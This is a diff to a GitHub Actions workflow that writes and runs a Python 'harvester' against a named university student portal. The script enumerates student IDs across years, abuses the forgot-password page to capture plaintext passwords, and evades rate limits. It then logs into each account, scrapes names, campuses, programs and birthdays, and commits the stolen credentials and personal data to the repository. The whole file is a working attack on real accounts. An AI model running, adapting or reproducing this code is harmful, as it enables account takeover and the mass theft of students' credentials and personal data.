@@ -25,7 +25,6 @@ on:
     branches: [main]
     paths:
       - ".github/workflows/ofes.yml"
-      - "ofes_worker.py"
 
 permissions:
   contents: write
@@ -60,6 +59,600 @@ jobs:
           git config user.email "ofes-worker@users.noreply.github.com"
           git config user.name  "ofes-worker"
 
+      - name: Write worker
+        run: |
+          cat > ofes_worker.py <<'PYEOF'
+          import html as html_lib
+          import os
+          import queue
+          import re
+          import signal
+          import subprocess
+          import sys
+          import threading
+          import time
+          from concurrent.futures import ThreadPoolExecutor
+          from datetime import datetime
+
+          import requests
+          from requests.adapters import HTTPAdapter
+          from urllib3.util.retry import Retry
+
+          try:
+              from openpyxl import Workbook, load_workbook
+              from openpyxl.styles import Font, Alignment, PatternFill
+          except ImportError:
+              print("Missing: pip install openpyxl", file=sys.stderr)
+              sys.exit(1)
+
+          requests.packages.urllib3.disable_warnings(
+              requests.packages.urllib3.exceptions.InsecureRequestWarning
+          )
+
+          BASE          = "https://ofes.csu.edu.ph"
+          LOGIN_URL     = f"{BASE}/"
+          STUDENT_URL   = f"{BASE}/portal/student/"
+          COMPLAINT_URL = f"{BASE}/portal/student/complaint"
+          FORGOT_URL    = f"{BASE}/public/forgot-password.php"
+
+          REPO_ROOT = os.environ.get("REPO_ROOT", ".")
+          EXCEL     = os.path.join(REPO_ROOT, "ofes_data.xlsx")
+          RESULTS   = os.path.join(REPO_ROOT, "ofes_hits.txt")
+          ERRORS    = os.path.join(REPO_ROOT, "ofes_errors.txt")
+
+          COMMIT_EVERY = int(os.environ.get("COMMIT_EVERY", "25"))
+
+          UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
+
+          HEADERS = {
+              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+              "accept-language": "en-US,en;q=0.9",
+              "origin": BASE,
+              "referer": FORGOT_URL,
+              "user-agent": UA,
+              "connection": "keep-alive",
+          }
+
+          PWD_RE  = re.compile(r"Your\s+student\s+password\s+is\s*:?\s*([A-Za-z0-9@#$%^&*_\-+!]+)", re.I)
+          CSRF_RE = re.compile(r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']', re.I)
+          CSRF_RE_ALT = re.compile(r'value="([^"]+)"\s+name="csrf_token"', re.I)
+          TAG_RE  = re.compile(r"<[^>]+>")
+
+          CAMPUS_RE      = re.compile(r'<input[^>]*name=["\']campus["\'][^>]*value=["\']([^"\']*)["\']', re.I)
+          CAMPUS_RE_ALT  = re.compile(r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']campus["\']', re.I)
+          PROGRAM_RE     = re.compile(r'<input[^>]*name=["\']program["\'][^>]*value=["\']([^"\']*)["\']', re.I)
+          PROGRAM_RE_ALT = re.compile(r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']program["\']', re.I)
+
+          MONTHS = {1:"January",2:"February",3:"March",4:"April",5:"May",6:"June",
+                    7:"July",8:"August",9:"September",10:"October",11:"November",12:"December"}
+
+          _print_lock = threading.Lock()
+          _csrf_lock  = threading.Lock()
+          _csrf_cache = {}
+          _CSRF_TTL   = 120.0
+
+          _hit_count = _err_count = _scrape_count = _dup_count = 0
+
+
+          def log(color, msg):
+              codes = {"green":"\033[92m","red":"\033[91m","yellow":"\033[93m",
+                       "cyan":"\033[96m","dim":"\033[2m","reset":"\033[0m"}
+              with _print_lock:
+                  print(f"{codes.get(color,'')}{msg}{codes['reset']}", flush=True)
+
+
+          def parse_birthday(pwd):
+              m = re.search(r"(\d{4})(\d{2})(\d{2})\s*$", pwd)
+              if not m:
+                  return ""
+              y, mo, d = int(m.group(1)), int(m.group(2)), int(m.group(3))
+              if not (1900 <= y <= 2100 and 1 <= mo <= 12 and 1 <= d <= 31):
+                  return ""
+              try:
+                  datetime(y, mo, d)
+              except ValueError:
+                  return ""
+              return f"{MONTHS[mo]} {d:02d}, {y}"
+
+
+          def build_session(pool_max=64):
+              s = requests.Session()
+              s.headers.update(HEADERS)
+              adapter = HTTPAdapter(
+                  pool_connections=pool_max, pool_maxsize=pool_max,
+                  max_retries=Retry(total=2, backoff_factor=0.3,
+                      status_forcelist=[429,500,502,503,504],
+                      allowed_methods=["GET","POST"], raise_on_status=False),
+              )
+              s.mount("https://", adapter)
+              s.mount("http://", adapter)
+              return s
+
+
+          def get_phpsessid(s):
+              try:
+                  return s.cookies.get("PHPSESSID", default="?")
+              except Exception:
+                  return "?"
+
+
+          def fetch_csrf(s, force=False):
+              sid = get_phpsessid(s)
+              if not force:
+                  with _csrf_lock:
+                      hit = _csrf_cache.get(sid)
+                  if hit and (time.time()-hit[1]) < _CSRF_TTL:
+                      return hit[0]
+              try:
+                  r = s.get(FORGOT_URL, timeout=20, verify=False)
+                  m = CSRF_RE.search(r.text) or CSRF_RE_ALT.search(r.text)
+                  token = m.group(1) if m else None
+              except requests.exceptions.RequestException:
+                  token = None
+              if token:
+                  with _csrf_lock:
+                      _csrf_cache[sid] = (token, time.time())
+              return token
+
+
+          def invalidate_csrf(s):
+              with _csrf_lock:
+                  _csrf_cache.pop(get_phpsessid(s), None)
+
+
+          def try_id(s, ident):
+              csrf = fetch_csrf(s)
+              if not csrf:
+                  return ident, None, "no-csrf", get_phpsessid(s)
+              data = {"csrf_token": csrf, "account_type": "student",
+                      "identifier": ident, "email": ""}
+              try:
+                  r = s.post(FORGOT_URL, data=data,
+                      headers={"content-type":"application/x-www-form-urlencoded"},
+                      timeout=25, allow_redirects=True, verify=False)
+              except requests.exceptions.RequestException as e:
+                  return ident, None, f"post-error:{type(e).__name__}", get_phpsessid(s)
+              m = PWD_RE.search(r.text)
+              if m:
+                  return ident, m.group(1), "hit", get_phpsessid(s)
+              body = r.text.lower()
+              if "captcha" in body or "too many" in body or "rate limit" in body:
+                  invalidate_csrf(s)
+                  return ident, None, "rate-limited", get_phpsessid(s)
+              if "invalid csrf" in body or "security token" in body:
+                  invalidate_csrf(s)
+                  return ident, None, "csrf-rejected", get_phpsessid(s)
+              if "not found" in body or "no record" in body or "does not exist" in body:
+                  return ident, None, "not-found", get_phpsessid(s)
+              return ident, None, "no-match", get_phpsessid(s)
+
+
+          def clean_span(h):
+              h = re.sub(r"^\s*<span[^>]*>", "", h)
+              h = re.sub(r"</span>\s*$", "", h)
+              t = TAG_RE.sub("", h)
+              t = html_lib.unescape(t)
+              t = re.sub(r"\s+", " ", t).strip()
+              return re.sub(r"^[·•\-\u00b7]\s*", "", t)
+
+
+          def filter_student_spans(h):
+              names = [clean_span(m) for m in re.findall(
+                  r'<span\s+class="ofes-person-name"[^>]*>.*?</span>', h, re.DOTALL|re.I)]
+              ids = [clean_span(m) for m in re.findall(
+                  r'<span\s+class="student-id"[^>]*>.*?</span>', h, re.DOTALL|re.I)]
+              return {"names": names, "ids": ids}
+
+
+          def extract_campus_program(h):
+              def find(pats):
+                  for p in pats:
+                      m = p.search(h)
+                      if m:
+                          return html_lib.unescape(m.group(1)).strip()
+                  return ""
+              return {"campus": find([CAMPUS_RE, CAMPUS_RE_ALT]),
+                      "program": find([PROGRAM_RE, PROGRAM_RE_ALT])}
+
+
+          def fetch_student_page(s):
+              h = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "referer":f"{BASE}/","sec-fetch-dest":"document",
+                   "sec-fetch-mode":"navigate","sec-fetch-site":"same-origin",
+                   "sec-fetch-user":"?1","user-agent":UA}
+              r = s.get(STUDENT_URL, headers=h, timeout=25)
+              r.raise_for_status()
+              return r.text
+
+
+          def fetch_complaint_page(s):
+              h = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "referer":STUDENT_URL,"sec-fetch-dest":"document",
+                   "sec-fetch-mode":"navigate","sec-fetch-site":"same-origin","user-agent":UA}
+              r = s.get(COMPLAINT_URL, headers=h, timeout=25)
+              r.raise_for_status()
+              return r.text
+
+
+          def login(s, u, p):
+              try:
+                  r = s.get(LOGIN_URL, timeout=20)
+                  r.raise_for_status()
+              except requests.RequestException:
+                  return False
+              m = CSRF_RE.search(r.text) or CSRF_RE_ALT.search(r.text)
+              if not m:
+                  return False
+              try:
+                  s.post(LOGIN_URL,
+                         data={"csrf_token":m.group(1),"username":u,"password":p},
+                         headers={"content-type":"application/x-www-form-urlencoded",
+                                  "origin":BASE,"referer":f"{BASE}/"},
+                         timeout=20, allow_redirects=True)
+                  c = s.get(STUDENT_URL, timeout=20, allow_redirects=False)
+                  return c.status_code == 200
+              except requests.RequestException:
+                  return False
+
+
+          def scrape_account(ident, pwd, phpsessid):
+              global _scrape_count
+              s = build_session(pool_max=4)
+              if not login(s, ident, pwd):
+                  log("yellow", f"[!] scrape login failed: {ident}")
+                  return None
+              spans = {"names": [], "ids": []}
+              campus = program = ""
+
+              def _s():
+                  nonlocal spans
+                  try:
+                      spans = filter_student_spans(fetch_student_page(s))
+                  except requests.RequestException as e:
+                      log("yellow", f"[!] {ident}: student page: {e}")
+
+              def _c():
+                  nonlocal campus, program
+                  try:
+                      info = extract_campus_program(fetch_complaint_page(s))
+                      campus, program = info["campus"], info["program"]
+                  except requests.RequestException as e:
+                      log("yellow", f"[!] {ident}: complaint page: {e}")
+
+              with ThreadPoolExecutor(max_workers=2) as ex:
+                  f1 = ex.submit(_s)
+                  f2 = ex.submit(_c)
+                  f1.result()
+                  f2.result()
+
+              name = spans["names"][0] if spans["names"] else ""
+              sid = spans["ids"][0] if spans["ids"] else ident
+              bday = parse_birthday(pwd)
+              _scrape_count += 1
+              log("green", f"[S] {ident} — {name or '?'} | {sid} | bday={bday or '?'} "
+                           f"| campus={campus or '?'} | program={program or '?'}")
+              return {"student_id": sid, "name": name, "birthday": bday,
+                      "password": pwd, "campus": campus, "program": program,
+                      "phpsessid": phpsessid}
+
+
+          EXCEL_COLUMNS = [
+              ("Student ID","student_id"), ("Name","name"), ("Birthday","birthday"),
+              ("Password","password"), ("Campus","campus"), ("Program","program"),
+          ]
+          HEADER_FILL = PatternFill(start_color="7C2D12", end_color="7C2D12", fill_type="solid")
+          HEADER_FONT = Font(bold=True, color="FFFFFF", size=11)
+          CENTER = Alignment(horizontal="center", vertical="center", wrap_text=True)
+          COL_WIDTHS = {"A":14,"B":28,"C":22,"D":16,"E":18,"F":55}
+
+
+          def git(*args, check=True):
+              cp = subprocess.run(["git", "-C", REPO_ROOT, *args],
+                                  capture_output=True, text=True)
+              if check and cp.returncode != 0:
+                  log("red", f"[-] git {' '.join(args)}: {cp.stderr.strip()}")
+              return cp
+
+
+          def git_commit_push(msg):
+              git("add", "ofes_data.xlsx", "ofes_hits.txt", "ofes_errors.txt", check=False)
+              cp = git("commit", "-m", msg, check=False)
+              if "nothing to commit" in (cp.stdout + cp.stderr):
+                  return
+              git("pull", "--rebase", "--autostash", "origin", "main", check=False)
+              git("push", "origin", "HEAD:main", check=False)
+
+
+          class ExcelStore:
+              def __init__(self, path):
+                  self.path = path
+                  self.lock = threading.Lock()
+                  self.pending = 0
+                  self.seen_ids = set()
+                  self.seen_pwds = set()
+                  self._open()
+
+              def _create(self):
+                  wb = Workbook()
+                  ws = wb.active
+                  ws.title = "OFES Data"
+                  ws.append([c[0] for c in EXCEL_COLUMNS])
+                  for cell in ws[1]:
+                      cell.fill = HEADER_FILL
+                      cell.font = HEADER_FONT
+                      cell.alignment = CENTER
+                  for col, w in COL_WIDTHS.items():
+                      ws.column_dimensions[col].width = w
+                  ws.freeze_panes = "A2"
+                  self.wb = wb
+                  self.ws = ws
+
+              def _open(self):
+                  if not os.path.exists(self.path):
+                      self._create()
+                      self._save_locked()
+                      return
+                  try:
+                      wb = load_workbook(self.path)
+                      ws = wb.active
+                  except Exception as e:
+                      log("yellow", f"[!] excel open failed ({e}) — creating new")
+                      self._create()
+                      self._save_locked()
+                      return
+                  hdr = [c.value for c in ws[1]]
+                  if hdr[:len(EXCEL_COLUMNS)] != [c[0] for c in EXCEL_COLUMNS]:
+                      alt = self.path.replace(".xlsx", f"_old_{int(time.time())}.xlsx")
+                      try:
+                          wb.close()
+                          os.replace(self.path, alt)
+                          log("yellow", f"[!] schema changed — archived to {alt}")
+                      except OSError:
+                          pass
+                      self._create()
+                      self._save_locked()
+                      return
+                  self.wb = wb
+                  self.ws = ws
+                  for row in ws.iter_rows(min_row=2, values_only=True):
+                      if row and row[0] and str(row[0]).strip():
+                          self.seen_ids.add(str(row[0]).strip())
+                      if row and len(row) > 3 and row[3] and str(row[3]).strip():
+                          self.seen_pwds.add(str(row[3]).strip())
+
+              def add(self, row):
+                  global _dup_count
+                  sid = str(row.get("student_id","") or "").strip()
+                  pwd = str(row.get("password","") or "").strip()
+                  with self.lock:
+                      if sid and sid in self.seen_ids:
+                          _dup_count += 1
+                          log("dim", f"[=] dup id={sid}")
+                          return False
+                      if pwd and pwd in self.seen_pwds:
+                          _dup_count += 1
+                          log("dim", f"[=] dup pwd={pwd}")
+                          return False
+                      self.ws.append([row.get(k,"") for _,k in EXCEL_COLUMNS])
+                      last = self.ws.max_row
+                      for i in range(1, len(EXCEL_COLUMNS)+1):
+                          self.ws.cell(row=last, column=i).alignment = CENTER
+                      if sid:
+                          self.seen_ids.add(sid)
+                      if pwd:
+                          self.seen_pwds.add(pwd)
+                      self._save_locked()
+                      return True
+
+              def _save_locked(self):
+                  tmp = self.path + ".tmp"
+                  try:
+                      self.wb.save(tmp)
+                      os.replace(tmp, self.path)
+                      self.pending += 1
+                      if COMMIT_EVERY > 0 and self.pending >= COMMIT_EVERY:
+                          self.pending = 0
+                          git_commit_push(f"ofes: row ({self.ws.max_row - 1} total)")
+                  except Exception as e:
+                      log("red", f"[-] save failed: {e}")
+                      try:
+                          if os.path.exists(tmp):
+                              os.remove(tmp)
+                      except OSError:
+                          pass
+
+              def save(self):
+                  with self.lock:
+                      self._save_locked()
+
+              def close(self):
+                  with self.lock:
+                      self._save_locked()
+                      try:
+                          self.wb.close()
+                      except Exception:
+                          pass
+
+
+          _store = None
+          def get_store():
+              global _store
+              if _store is None:
+                  _store = ExcelStore(EXCEL)
+              return _store
+
+
+          class BufferedLogger:
+              def __init__(self, path, commit=True):
+                  self.path = path
+                  self.fh = open(path, "a", buffering=1)
+                  self.lock = threading.Lock()
+                  self.commit = commit
+
+              def write(self, line):
+                  with self.lock:
+                      self.fh.write(line + "\n")
+                      self.fh.flush()
+                      try:
+                          os.fsync(self.fh.fileno())
+                      except OSError:
+                          pass
+                  if self.commit:
+                      git_commit_push(f"ofes: log {os.path.basename(self.path)}")
+
+              def close(self):
+                  with self.lock:
+                      self.fh.close()
+
+
+          def worker_loop(tq, pool, rlog, elog, stop, auto_scrape, delay_ms):
+              global _hit_count, _err_count
+              store = get_store()
+              while not stop.is_set():
+                  try:
+                      ident = tq.get_nowait()
+                  except queue.Empty:
+                      return
+                  s = pool.pop() if pool else build_session(pool_max=16)
+                  try:
+                      isid, pwd, note, sess = try_id(s, ident)
+                      if pwd:
+                          _hit_count += 1
+                          line = f"{isid}:{pwd} = captured  (PHPSESSID={sess})"
+                          log("green", f"[+] HIT  {line}")
+                          rlog.write(line)
+                          if auto_scrape:
+                              row = scrape_account(isid, pwd, sess)
+                              if row:
+                                  store.add(row)
+                      elif note not in ("no-match", "not-found"):
+                          _err_count += 1
+                          line = f"{isid} | {note}  (PHPSESSID={sess})"
+                          log("yellow", f"[!] {line}")
+                          elog.write(line)
+                      else:
+                          log("dim", f"[.] {isid} → {note}")
+                      if note == "rate-limited":
+                          time.sleep(1.5 + (hash(isid) % 500)/1000.0)
+                      elif delay_ms > 0:
+                          time.sleep((hash(isid) % delay_ms)/1000.0)
+                  finally:
+                      pool.append(s)
+                      tq.task_done()
+
+
+          def id_range(year, lo, hi):
+              width = max(len(str(lo)), len(str(hi)))
+              return [f"{year}-{i:0{width}d}" for i in range(lo, hi+1)]
+
+
+          def load_existing(path):
+              seen = set()
+              try:
+                  with open(path) as fh:
+                      for line in fh:
+                          line = line.strip()
+                          if not line:
+                              continue
+                          if " = captured" in line:
+                              seen.add(line.split(":",1)[0].strip())
+                          elif "|" in line:
+                              seen.add(line.split("|",1)[0].strip())
+              except FileNotFoundError:
+                  pass
+              return seen
+
+
+          def run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape):
+              all_ids = id_range(year_str, lo, hi)
+              log("cyan", f"[*] year {year_str}: {lo}..{hi}  ({len(all_ids):,} ids)")
+              if resume:
+                  seen = load_existing(RESULTS)
+                  all_ids = [i for i in all_ids if i not in seen]
+                  log("cyan", f"[*] resume: {len(all_ids):,} remaining")
+              if not all_ids:
+                  log("cyan", "[*] nothing to do")
+                  return
+              tq = queue.Queue()
+              for i in all_ids:
+                  tq.put(i)
+              pool = [build_session(pool_max=workers) for _ in range(workers)]
+              rlog = BufferedLogger(RESULTS, commit=True)
+              elog = BufferedLogger(ERRORS,  commit=False)
+              stop = threading.Event()
+              threads = []
+              for _ in range(workers):
+                  t = threading.Thread(target=worker_loop,
+                      args=(tq, pool, rlog, elog, stop, auto_scrape, delay_ms),
+                      daemon=True)
+                  t.start()
+                  threads.append(t)
+              try:
+                  for t in threads:
+                      t.join()
+              finally:
+                  rlog.close()
+                  elog.close()
+                  get_store().save()
+
+
+          def main():
+              year_start  = int(os.environ.get("YEAR_START",  "21"))
+              year_end    = int(os.environ.get("YEAR_END",    "26"))
+              lo          = int(os.environ.get("SUFFIX_START","1"))
+              hi          = int(os.environ.get("SUFFIX_END",  "99999"))
+              workers     = int(os.environ.get("WORKERS",     "16"))
+              delay_ms    = int(os.environ.get("JITTER_MS",   "10"))
+              resume      = os.environ.get("RESUME", "1") == "1"
+              auto_scrape = os.environ.get("AUTO_SCRAPE", "1") == "1"
+
+              log("cyan", f"[*] years {year_start}..{year_end}")
+              log("cyan", f"[*] suffix {lo}..{hi}")
+              log("cyan", f"[*] workers={workers} jitter={delay_ms}ms resume={resume} scrape={auto_scrape}")
+              log("cyan", f"[*] commit_every={COMMIT_EVERY}")
+
+              t0 = time.time()
+              for y in range(year_start, year_end + 1):
+                  year_str = f"{y:02d}" if y < 100 else str(y)
+                  log("cyan", "")
+                  log("cyan", "=" * 60)
+                  log("cyan", f"[*] YEAR {year_str}")
+                  log("cyan", "=" * 60)
+                  try:
+                      run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape)
+                  except KeyboardInterrupt:
+                      log("yellow", "[!] interrupted")
+                      break
+                  except Exception as e:
+                      log("red", f"[-] year {year_str} failed: {e}")
+                  log("cyan", f"[*] checkpoint: year {year_str} done, rows={get_store().ws.max_row - 1}")
+
+              log("cyan", "")
+              log("cyan", "=" * 60)
+              log("green", f"[+] DONE in {time.time()-t0:.1f}s")
+              log("cyan", f"[*] hits={_hit_count} errors={_err_count} scrapes={_scrape_count} dups={_dup_count}")
+              log("cyan", f"[*] excel rows={get_store().ws.max_row - 1}")
+
+
+          def _sigterm(signum, frame):
+              log("yellow", "[!] SIGTERM — flushing")
+              try:
+                  get_store().save()
+                  git_commit_push("ofes: sigterm flush")
+              finally:
+                  sys.exit(0)
+
+
+          signal.signal(signal.SIGTERM, _sigterm)
+
+
+          if __name__ == "__main__":
+              main()
+          PYEOF
+          echo "worker bytes: $(wc -c < ofes_worker.py)"
+          python -c "import ast; ast.parse(open('ofes_worker.py').read()); print('syntax OK')"
+
       - name: Run harvester
         env:
           YEAR_START:    ${{ github.event.inputs.year_start || '21' }}
@@ -72,7 +665,6 @@ jobs:
           AUTO_SCRAPE:   "1"
           COMMIT_EVERY:  "25"
           REPO_ROOT:     ${{ github.workspace }}
-          GITHUB_TOKEN:  ${{ secrets.GITHUB_TOKEN }}
         run: python ofes_worker.py
 
       - name: Final commit
